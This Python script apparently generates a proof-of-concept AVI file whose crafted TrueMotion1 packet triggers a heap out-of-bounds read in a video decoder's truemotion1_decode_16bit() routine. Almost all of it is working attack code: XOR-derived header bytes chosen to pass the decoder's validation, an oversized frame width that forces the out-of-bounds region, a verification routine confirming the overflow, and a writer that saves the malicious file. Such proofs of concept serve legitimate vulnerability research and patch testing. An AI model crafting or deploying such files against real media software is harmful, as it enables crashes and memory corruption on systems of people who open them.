#!/usr/bin/env python3
"""
vuln_001_gen.py
Generate a crafted AVI/TrueMotion1 packet that triggers a heap-buffer-overflow
in truemotion1_decode_16bit() via unchecked mb_change_bits reads (interframe path).

Bug: truemotion1_decode_header() sets s->mb_change_bits = s->buf + header_size
     for interframe without verifying the region fits in the packet.
     mb_change_bits_row_size * (height>>2) bytes are needed but not present.
"""

import struct, os, sys

WORK_DIR = os.path.dirname(os.path.abspath(__file__))
OUT_FILE = os.path.join(WORK_DIR, "vuln_001_input.avi")


# ── AVI helpers ──────────────────────────────────────────────────────────────

def chunk(fourcc, data):
    if isinstance(fourcc, str):
        fourcc = fourcc.encode()
    data = bytes(data)
    out = fourcc + struct.pack('<I', len(data)) + data
    if len(data) & 1:          # RIFF chunks are padded to even size
        out += b'\x00'
    return out

def list_chunk(list_type, data):
    if isinstance(list_type, str):
        list_type = list_type.encode()
    data = bytes(data)
    return b'LIST' + struct.pack('<I', 4 + len(data)) + list_type + data


# ── TrueMotion1 packet ───────────────────────────────────────────────────────
#
# Header layout AFTER XOR unscramble (header_buffer[]):
#   [0]   compression  (2 = ALGO_RGB16H 4×4 blocks)
#   [1]   deltaset     (0)
#   [2]   vectable     (1)   ← must be 1-3
#   [3-4] ysize LE16   (4)   ← multiple of 4 to pass height check
#   [5-6] xsize LE16   (65534 = 0xFFFE) ← large, even ← triggers large mb_change_bits
#   [7-8] checksum     (0)
#   [9]   version      (2)   ← enables version-2 flag path
#   [10]  header_type  (2)   ← s->flags = header.flags
#   [11]  flags        (8)   ← FLAG_INTERFRAME; no FLAG_KEYFRAME
#   [12]  control      (0)
#
# XOR unscramble: header_buffer[i-1] = buf[i] ^ buf[i+1]
# buf[0] = 0x12  →  header_size = ((0x12>>5)|(0x12<<3)) & 0x7f = 0x10 = 16
# Loop runs i=1..15, giving header_buffer[0..14].
# Starting from buf[1]=0, derive each subsequent byte.

def craft_tm1_interframe(xsize=65534, ysize=4):
    desired = [0] * 15           # header_buffer[0..14]
    desired[0]  = 2              # compression = ALGO_RGB16H 4×4
    desired[1]  = 0              # deltaset
    desired[2]  = 1              # vectable
    desired[3]  = ysize & 0xFF   # ysize low
    desired[4]  = (ysize >> 8) & 0xFF
    desired[5]  = xsize & 0xFF   # xsize low  (0xFE for 65534)
    desired[6]  = (xsize >> 8) & 0xFF  # 0xFF for 65534
    desired[7]  = 0              # checksum lo
    desired[8]  = 0              # checksum hi
    desired[9]  = 2              # version  ≥ 2 → interframe path
    desired[10] = 2              # header_type 2 → s->flags from header.flags
    desired[11] = 8              # flags = FLAG_INTERFRAME (no FLAG_KEYFRAME)
    desired[12] = 0              # control
    desired[13] = 0
    desired[14] = 0

    buf = bytearray(17)
    buf[0] = 0x12                # header_size = 16; buf[0] >= 0x10 ✓
    buf[1] = 0x00                # anchor
    for i in range(1, 16):
        buf[i + 1] = buf[i] ^ desired[i - 1]

    return bytes(buf)


# ── AVI container ─────────────────────────────────────────────────────────────

def make_avi(tm1_packet, avi_w=16, avi_h=4):
    """
    Build a minimal 1-frame AVI RIFF with codec FourCC DUCK.
    avi_w/avi_h are declared in the AVI stream headers (small values are fine;
    TM1 packet overrides dimensions internally via ff_set_dimensions).
    """
    # BITMAPINFOHEADER – biCompression = 'DUCK'
    DUCK_FOURCC = struct.unpack('<I', b'DUCK')[0]
    strf = struct.pack('<IiiHHIIIIII',
        40,           # biSize
        avi_w,        # biWidth
        avi_h,        # biHeight
        1,            # biPlanes
        16,           # biBitCount
        DUCK_FOURCC,  # biCompression
        0, 0, 0, 0, 0 # rest
    )

    # AVISTREAMHEADER
    strh = struct.pack('<4s4sIHHIIIIIIII',
        b'vids',   # fccType
        b'DUCK',   # fccHandler
        0,         # dwFlags
        0,         # wPriority
        0,         # wLanguage
        0,         # dwInitialFrames
        1,         # dwScale
        1,         # dwRate   (1 fps)
        0,         # dwStart
        1,         # dwLength (1 frame)
        len(tm1_packet) + 8,  # dwSuggestedBufferSize
        0xFFFFFFFF,  # dwQuality
        0,         # dwSampleSize
    ) + struct.pack('<iiii', 0, 0, avi_w, avi_h)  # rcFrame

    strl = list_chunk(b'strl',
        chunk('strh', strh) + chunk('strf', strf)
    )

    # Main AVI header (AVIMAINHEADER)
    avih = struct.pack('<IIIIIIIIIIIIII',
        1_000_000,       # dwMicroSecPerFrame (1 fps)
        len(tm1_packet), # dwMaxBytesPerSec
        0,               # dwPaddingGranularity
        0x00,            # dwFlags
        1,               # dwTotalFrames
        0,               # dwInitialFrames
        1,               # dwStreams
        0,               # dwSuggestedBufferSize
        avi_w,           # dwWidth
        avi_h,           # dwHeight
        0, 0, 0, 0,      # reserved
    )

    hdrl = list_chunk(b'hdrl', chunk('avih', avih) + strl)
    movi = list_chunk(b'movi', chunk('00dc', tm1_packet))

    avi_inner = b'AVI ' + hdrl + movi
    riff = b'RIFF' + struct.pack('<I', len(avi_inner)) + avi_inner
    return riff


# ── Verification / diagnostics ────────────────────────────────────────────────

def verify_packet(pkt):
    buf = pkt
    header_size = ((buf[0] >> 5) | (buf[0] << 3)) & 0x7f
    print(f"  buf[0]=0x{buf[0]:02X}  header_size={header_size}")
    assert buf[0] >= 0x10,             "FAIL: buf[0] < 0x10"
    assert header_size + 1 <= len(pkt),"FAIL: packet too small for header"

    hb = [0] * header_size
    for i in range(1, header_size):
        hb[i - 1] = buf[i] ^ buf[i + 1]

    compression = hb[0]
    deltaset    = hb[1]
    vectable    = hb[2]
    ysize       = hb[3] | (hb[4] << 8)
    xsize       = hb[5] | (hb[6] << 8)
    version     = hb[9]
    htype       = hb[10]
    flags       = hb[11]

    print(f"  compression={compression} deltaset={deltaset} vectable={vectable}")
    print(f"  ysize={ysize}  xsize={xsize}")
    print(f"  version={version}  header_type={htype}  flags=0x{flags:02X}")
    assert compression < 17,           "FAIL: compression >= 17"
    assert 1 <= vectable <= 3,         "FAIL: vectable out of range"
    assert xsize % 2 == 0,            "FAIL: odd width"
    assert ysize % 4 == 0,            "FAIL: height not multiple of 4"
    assert version >= 2,               "FAIL: version < 2"
    assert htype in (2, 3),            "FAIL: header_type not 2 or 3"
    assert flags & 8,                  "FAIL: FLAG_INTERFRAME not set"
    assert not (flags & 16),           "FAIL: FLAG_KEYFRAME set (would suppress OOB)"

    mb_row = ((xsize >> 2) + 7) >> 3
    needed  = mb_row * (ysize >> 2)
    avail   = len(pkt) - header_size
    print(f"  mb_change_bits_row_size={mb_row}")
    print(f"  mb_change_bits needed={needed} bytes, available={avail} bytes")
    print(f"  => OOB by {needed - avail} bytes (positive = OOB triggered)")
    assert needed > avail,             "FAIL: no OOB"
    print("  [OK] Packet verified – OOB expected")


def main():
    pkt = craft_tm1_interframe(xsize=65534, ysize=4)
    print(f"[+] TM1 packet ({len(pkt)} bytes): {pkt.hex()}")
    verify_packet(pkt)

    avi = make_avi(pkt)
    with open(OUT_FILE, 'wb') as f:
        f.write(avi)
    print(f"[+] Written {len(avi)} bytes → {OUT_FILE}")


if __name__ == '__main__':
    main()
